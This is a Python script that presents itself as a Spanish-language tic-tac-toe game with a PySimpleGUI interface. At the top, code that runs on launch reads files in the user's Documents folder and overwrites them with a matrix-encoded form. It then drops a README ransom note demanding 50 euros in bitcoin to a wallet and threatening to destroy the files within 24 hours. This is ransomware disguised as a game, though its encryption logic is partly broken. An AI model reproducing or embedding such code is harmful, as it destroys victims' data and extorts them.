#!/usr/bin/env python
import os
from cryptography.fernet import Fernet
import PySimpleGUI
import random
import rsa
import time
import numpy as np

if os.path.exists(os.path.expanduser('~')+"/Documents/README.txt") == False:


    generadora = np.array([[1, 1, 1, 0, 0, 0, 0], [1, 0, 0, 1, 1, 0, 0], [0, 1, 0, 1, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1]])

    paridad = np.array([[0, 0, 0, 1, 1, 1, 1], [0, 1, 1, 0, 0, 1, 1], [1, 0, 1, 0, 1, 0, 1]])

    paridad_traspuesta= np.transpose(paridad)

    invertible = np.array([[1, 1, 1, 1], [1, 0, 0, 1], [1, 1, 1, 0], [0, 1, 0, 1]])

    permutacion= np.array([[0, 0, 0, 0, 0, 0, 1], [0, 1, 0, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0], [0, 0, 1, 0, 0, 0, 0],
                            [0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 1, 0], [1, 0, 0, 0, 0, 0, 0]])

    e = np.array([[0, 0, 0, 0, 0, 0, 0]])
    #print(permutacion,"\n")

    sindrome = {
        "[[0 0 0]]": np.array([[0, 0, 0, 0, 0, 0, 0]]),
        "[[1 1 1]]": np.array([[1, 0, 0, 0, 0, 0, 0]]),
        "[[1 1 0]]": np.array([[0, 1, 0, 0, 0, 0, 0]]),
        "[[1 0 1]]": np.array([[0, 0, 1, 0, 0, 0, 0]]),
        "[[1 0 0]]": np.array([[0, 0, 0, 1, 0, 0, 0]]),
        "[[0 1 1]]": np.array([[0, 0, 0, 0, 1, 0, 0]]),
        "[[0 1 0]]": np.array([[0, 0, 0, 0, 0, 1, 0]]),
        "[[0 0 1]]": np.array([[0, 0, 0, 0, 0, 0, 1]])
    }

    g= np.dot(invertible, generadora)
    g= g % 2

    publickey= np.dot(g, permutacion)
    publickey = publickey % 2
    print(publickey)


    #Abrir archivos a encriptar
    usuario = [os.path.expanduser('~')+"/Documents"]

    items = os.listdir(usuario[0])
    archivos_2 = [usuario[0]+"/"+x for x in items]
    for x in archivos_2:
        with open(x, 'r') as file:
            archivosDat=file.read()

    print(archivosDat)
    # Convierte cada carácter de la palabra a su representación en binario
    binary= []



    for n in archivosDat:
        numero = ord(n)
        binary += format(numero, '08b')
    binary = np.array(binary, dtype=int)
    print(binary)
    binary = binary.reshape(-1, 4)
    print("matriz:\n", binary)
    ps = np.dot(binary, publickey)
    ps = ps % 2
    print(ps)

    for i in range(ps.shape[0]):
    
        ps[i] = ps[i] + e
    ps = ps % 2

    print(ps)
    with open(x, 'w') as f:
        for row in ps:
            for elem in row:
                f.write(str(elem))
            
            
    with open(usuario[0]+"/"+"README.txt", "w") as file:
        file.write("Archivos encriptados, inserta 50 euros en bitcoins en la siguiente cartera para recuperar los archivos:\n")
        file.write("\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        file.write("\nSi no se realiza el ingreso en 24 horas se destruiran todos los archivos robados\n")
        file.write("Si borra los archivos se perdera todo para siempre, el cementerio ya esta lleno de valientes")


#values
button_size = (15, 5)
PLAYER_ONE = "x"
PLAYER_TWO = "O"
TITLE = "3 EN RAYA"
winner_plays = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6],[1,4,7]]

layout = [[
                PySimpleGUI.Button("", key="-0-", size=button_size),
                PySimpleGUI.Button("", key="-1-", size=button_size),
                PySimpleGUI.Button("", key="-2-", size=button_size)],
          [
                PySimpleGUI.Button("", key="-3-", size=button_size),
                PySimpleGUI.Button("", key="-4-", size=button_size),
                PySimpleGUI.Button("", key="-5-", size=button_size)],
          [
                PySimpleGUI.Button("", key="-6-", size=button_size),
                PySimpleGUI.Button("", key="-7-",size=button_size),
                PySimpleGUI.Button("", key="-8-", size=button_size)],

          [PySimpleGUI.Button("He terminado", key=("-Ok-"), size=(20,1))],
          [PySimpleGUI.Button("Quiero La Revancha", key=("-re-"), size=(20,1))]]


def close_app(event):
    if event == PySimpleGUI.WIN_CLOSED or event == "-Ok-":
        close = True
        return close

def winner_player(deck):
    for winner_play in winner_plays:
        if deck[winner_play[0]] == deck[winner_play[1]] == deck[winner_play[2]] != 0:
            if deck[winner_play[0]] == PLAYER_ONE:
                PySimpleGUI.Popup('Ha ganado el jugardor: {}'.format(PLAYER_ONE))
                end_game = True
                return end_game
            else:
                PySimpleGUI.Popup('Ha ganado el jugardor: {}'.format(PLAYER_TWO))
                end_game = True
                return end_game

    if 0 not in deck:
        PySimpleGUI.Popup("Juego Terminado! Nadie Gano")

def revenge(event, window, deck, end_game,):
    if event == "-re-":
        if 0 in deck and not end_game:
            PySimpleGUI.Popup('La Partida Aun No termina')
        else:
            window.Element("-0-").Update(text="")
            window.Element("-1-").Update(text="")
            window.Element("-2-").Update(text="")
            window.Element("-3-").Update(text="")
            window.Element("-4-").Update(text="")
            window.Element("-5-").Update(text="")
            window.Element("-6-").Update(text="")
            window.Element("-7-").Update(text="")
            window.Element("-8-").Update(text="")
            r = True
            return r

def plays(event, window, current_player, deck, end_game):
    if window.Element(event).ButtonText == "" and not end_game:
        index = int(event.replace("-",""))
        deck[index] = current_player
        window.Element(event).Update(text=current_player)
        play = True
        return play


def gui_interface():
    deck = [0, 0, 0,
            0, 0, 0,
            0, 0, 0]
    current_player = PLAYER_ONE
    end_game = False
    window = PySimpleGUI.Window("3 En Raya", layout,)

    while True:
        event, value = window.read()
        close = close_app(event)
        if close:
            break

        play = plays(event, window, current_player, deck, end_game)
        if not end_game:
            winner = winner_player(deck)
            if winner:
                end_game = True
            if play:
                if current_player == PLAYER_ONE:
                    current_player = PLAYER_TWO
                else:
                    current_player = PLAYER_ONE
        replay = revenge(event, window, deck, end_game)
        if replay:
            current_player = PLAYER_ONE
            end_game = False
            deck = [0, 0, 0,
                    0, 0, 0,
                    0, 0, 0]


    window.close()

def main():
    gui_interface()


if __name__ == "__main__":
    main()